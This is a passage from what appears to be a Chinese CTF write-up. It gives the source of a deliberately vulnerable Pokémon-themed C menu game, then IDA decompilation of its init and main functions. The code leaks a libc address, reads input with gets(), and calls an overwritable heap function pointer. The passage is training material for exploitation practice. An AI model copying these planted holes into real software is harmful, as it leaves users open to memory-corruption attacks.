class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="comment">//速度计算</span></span><br><span class="line">                <span class="keyword">if</span>(myspeed&gt;emspeed)&#123;<span class="comment">//我方速度比较快</span></span><br><span class="line">                    myspeed -= emerypoke-&gt;speed;</span><br><span class="line">                    faster=<span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    emspeed -= (*mypoke)-&gt;speed;</span><br><span class="line">                    faster=<span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//攻击防御计算 //血量计算</span></span><br><span class="line">                <span class="keyword">if</span>(faster)&#123;</span><br><span class="line">                    emhp = emhp - (((*mypoke)-&gt;attack/<span class="number">2</span>)-(emerypoke-&gt;defence/<span class="number">3</span>));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    myhp = myhp - ((emerypoke-&gt;attack/<span class="number">2</span>)-((*mypoke)-&gt;defence/<span class="number">3</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                myspeed+=(*mypoke)-&gt;speed;</span><br><span class="line">                emspeed+=emerypoke-&gt;speed;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(myhp &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Game Over :(&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(emhp &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You win!&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span>(emerypoke-&gt;attack &gt; (*mypoke)-&gt;defence)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Even if you defend, the other party still kills you in seconds&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;The defense succeeded, but nothing happened&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">if</span>(emerypoke-&gt;speed &gt; (*mypoke)-&gt;speed)&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re not fast enough to escape the fight&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;Escape!&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Store</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice=<span class="number">0</span>;</span><br><span class="line">    store_again:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;m a merchant from GuanDu city, what do you want to buy?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Attack agents&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Defensive agents&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Poké Ball&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.EXIT&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> (choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            money-=<span class="number">75</span>;</span><br><span class="line">            (*mypoke)-&gt;attack+=<span class="number">10</span>;</span><br><span class="line">            (*mypoke)-&gt;defence-=<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            money-=<span class="number">75</span>;</span><br><span class="line">            (*mypoke)-&gt;attack-=<span class="number">10</span>;</span><br><span class="line">            (*mypoke)-&gt;defence+=<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            money-=<span class="number">75</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Are you sure this is not a name change card?&quot;</span>);</span><br><span class="line">            <span class="type">char</span>* newname=<span class="built_in">malloc</span>(<span class="number">15</span>);</span><br><span class="line">            change++;</span><br><span class="line">            <span class="comment">//scanf(&quot;%15s&quot;,newname);</span></span><br><span class="line">            <span class="comment">//Pokemon_name(mypoke,newname);</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> store_again;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You say: f**king Black-hearted businessman&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Status</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your money: %d\n&quot;</span>,money);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The status of your Pokémon is as follows&quot;</span>);</span><br><span class="line">    Pokemon_print(mypoke);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Over~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Pokemon_print</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Pokemon name:%s\n&quot;</span>,&amp;(*mypoke)-&gt;name[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hp:%u\n&quot;</span>,(*mypoke)-&gt;hp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AT:%u\n&quot;</span>,(*mypoke)-&gt;attack);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DE:%u\n&quot;</span>,(*mypoke)-&gt;defence);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SP:%u\n&quot;</span>,(*mypoke)-&gt;speed);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Pokemon_name</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke,<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        (*mypoke)-&gt;name[i]=str[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Start_choose</span><span class="params">(<span class="keyword">struct</span> pokemon** mypoke)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> choice=<span class="number">0</span>;</span><br><span class="line">    Start_choose_again:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please choose a pokemon to follow you&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Pika!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Little Fire Dragon!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3.Wonderful frog seeds!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.Jenny Turtle!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> (choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            *mypoke = (<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            (*mypoke)-&gt;hp=<span class="number">21</span>;</span><br><span class="line">            (*mypoke)-&gt;speed=<span class="number">16</span>;</span><br><span class="line">            (*mypoke)-&gt;defence=<span class="number">8</span>;</span><br><span class="line">            (*mypoke)-&gt;attack=<span class="number">14</span>;</span><br><span class="line">            Pokemon_name(mypoke,<span class="string">&quot;Pikapi&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            *mypoke = (<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            (*mypoke)-&gt;hp=<span class="number">25</span>;</span><br><span class="line">            (*mypoke)-&gt;speed=<span class="number">12</span>;</span><br><span class="line">            (*mypoke)-&gt;defence=<span class="number">14</span>;</span><br><span class="line">            (*mypoke)-&gt;attack=<span class="number">14</span>;</span><br><span class="line">            Pokemon_name(mypoke,<span class="string">&quot;Charmander&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            *mypoke = (<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            (*mypoke)-&gt;hp=<span class="number">31</span>;</span><br><span class="line">            (*mypoke)-&gt;speed=<span class="number">10</span>;</span><br><span class="line">            (*mypoke)-&gt;defence=<span class="number">11</span>;</span><br><span class="line">            (*mypoke)-&gt;attack=<span class="number">10</span>;</span><br><span class="line">            Pokemon_name(mypoke,<span class="string">&quot;Bulbasaur&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            *mypoke = (<span class="keyword">struct</span> pokemon*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">            (*mypoke)-&gt;hp=<span class="number">28</span>;</span><br><span class="line">            (*mypoke)-&gt;speed=<span class="number">9</span>;</span><br><span class="line">            (*mypoke)-&gt;defence=<span class="number">20</span>;</span><br><span class="line">            (*mypoke)-&gt;attack=<span class="number">9</span>;</span><br><span class="line">            Pokemon_name(mypoke,<span class="string">&quot;Squirtle&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> Start_choose_again;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Mainmenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1.Store&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Out&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Status&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.exit_the_world&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    ex1t=(<span class="type">size_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pokemon));</span><br><span class="line">    <span class="type">size_t</span> temp=&amp;<span class="built_in">exit</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(ex1t,&amp;temp,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Start_print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;,-.----.                                           ____                         &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\\    /  \\                  ,-.                   ,&#x27;  , `.                       &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;|   :    \\             ,--/ /|                ,-+-,.&#x27; _ |                       &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;|   |  .\\ :   ,---.  ,--. :/ |             ,-+-. ;   , ||   ,---.        ,---,  &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;.   :  |: |  &#x27;   ,&#x27;\\ :  : &#x27; /             ,--.&#x27;|&#x27;   |  ;|  &#x27;   ,&#x27;\\   ,-+-. /  | &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;|   |   \\ : /   /   ||  &#x27;  /      ,---.  |   |  ,&#x27;, |  &#x27;: /   /   | ,--.&#x27;|&#x27;   | &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;|   : .   /.   ; ,. :&#x27;  |  :     /     \\ |   | /  | |  ||.   ; ,. :|   |  ,\&quot;&#x27; | &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;;   | |`-&#x27; &#x27;   | |: :|  |   \\   /    /  |&#x27;   | :  | :  |,&#x27;   | |: :|   | /  | | &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;|   | ;    &#x27;   | .; :&#x27;  : |. \\ .    &#x27; / |;   . |  ; |--&#x27; &#x27;   | .; :|   | |  | | &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;:   &#x27; |    |   :    ||  | &#x27; \\ \&#x27;   ;   /||   : |  | ,    |   :    ||   | |  |/  &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;:   : :     \\   \\  / &#x27;  : |--&#x27; &#x27;   |  / ||   : &#x27;  |/      \\   \\  / |   | |--&#x27;   &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;|   | :      `----&#x27;  ;  |,&#x27;    |   :    |;   | |`-&#x27;        `----&#x27;  |   |/       &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;`---&#x27;.|              &#x27;--&#x27;       \\   \\  / |   ;/                    &#x27;---&#x27;        &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  `---`                          `----&#x27;  &#x27;---&#x27;                                                                                                     &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my Pokémon World, where you are now in the small town of Kinan, where people and elves get along in harmony! Hey! Your dream is to collect the world&#x27;s most famous mythical QWQ, come on adventurers, and embark on your adventure!&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">                                                                 </span><br></pre></td></tr></table></figure><h2 id="aJUjD">0x1 逆向</h2><p>checksec查看保护，全保护，将就着看吧。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730778726491-ca099a5d-f39e-4970-8160-a9df5ad2867f.png"></p><p>拖进ida分析，此时要先看init函数，因为里面可能藏了点东西，ex1t是一个指针，分配了一个chunk给它。</p><p>然后给堆上内存赋值exit的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  ex1t = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *(_QWORD *)ex1t = &amp;<span class="built_in">exit</span>;</span><br><span class="line">  <span class="keyword">return</span> v1 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">  _BYTE v5[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  _BYTE v7[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  Start_print();</span><br><span class="line">  Start_choose(v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You open the Starter Pack and get a hundred coins&quot;</span>);</span><br><span class="line">  money += <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="keyword">while</span> ( money &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Mainmenu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(aWhyDoesTechnol);</span><br><span class="line">      buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">      *((_DWORD *)buf + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">      *((_DWORD *)buf + <span class="number">6</span>) = <span class="number">1</span>;</span><br><span class="line">      *((_DWORD *)buf + <span class="number">5</span>) = <span class="number">1</span>;</span><br><span class="line">      *((_DWORD *)buf + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s so weak...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nWhat you want to say?&quot;</span>);</span><br><span class="line">        gets(v7);</span><br><span class="line">        (*(<span class="type">void</span> (__fastcall **)(_BYTE *))ex1t)(v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            Status(v5);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            Store(v5);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            Out(v5);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No money, you out:(&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>有个菜单，开局还送libc地址，这怎么输？</strong></p><p>但是首先会先让你选精灵，money+&#x3D;100，之后，就可以根据菜单去做题了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Mainmenu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Store&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Out&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Status&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.exit_the_world&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sylRr">Start_choose函数</h3><p>开局选精灵</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please choose a pokemon to follow you&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1.Pika!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2.Little Fire Dragon!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3.Wonderful frog seeds!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4.Jenny Turtle!&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里不急，我们往下面分配内存的代码看。</p><p>无论选什么都会分配0x20（实际上是0x20+0x10，具体请看ctfwiki堆概况章节）的堆块，这里我们并不知道每一个的意思，但是猜出这是一个结构体，和精灵有关，最有可能想到的是精灵的属性，想不到也不用管。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">Start_choose</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please choose a pokemon to follow you&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Pika!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Little Fire Dragon!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3.Wonderful frog seeds!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.Jenny Turtle!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          *(_QWORD *)a1 = <span 